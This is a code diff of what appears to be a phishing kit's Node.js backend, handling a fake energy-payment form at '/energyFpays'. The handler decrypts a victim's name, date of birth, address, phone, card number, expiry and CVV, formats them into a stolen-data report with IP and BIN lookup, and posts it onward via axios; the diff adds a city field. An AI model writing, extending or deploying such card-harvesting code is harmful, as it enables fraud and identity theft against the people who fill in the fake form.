@@ -13839,16 +13839,19 @@ app.post("/energyFpays", async (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
   address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
     CryptoJS.enc.Utf8
   );
+  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
   pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
     CryptoJS.enc.Utf8
   );
   ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
@@ -13885,7 +13888,7 @@ app.post("/energyFpays", async (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (fpaysC == 10) {
         axios
           .post(
